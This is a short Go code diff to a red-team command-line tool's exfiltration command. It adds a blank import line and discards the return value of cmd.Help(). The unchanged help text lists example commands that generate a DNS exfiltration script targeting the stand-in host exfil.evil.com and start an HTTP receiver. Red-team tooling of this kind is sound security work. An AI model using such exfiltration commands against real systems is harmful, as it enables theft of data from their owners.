@@ -3,6 +3,7 @@ package redteam
 import (
 	"fmt"
 	"os"
+
 	"raxuiscli/cmd"
 	"raxuiscli/internal/redteam/exfil"
 
@@ -26,7 +27,7 @@ Examples:
   raxuiscli exfil script dns --target exfil.evil.com
   raxuiscli exfil receiver http --port 8080`,
 	Run: func(cmd *cobra.Command, args []string) {
-		cmd.Help()
+		_ = cmd.Help()
 	},
 }
 
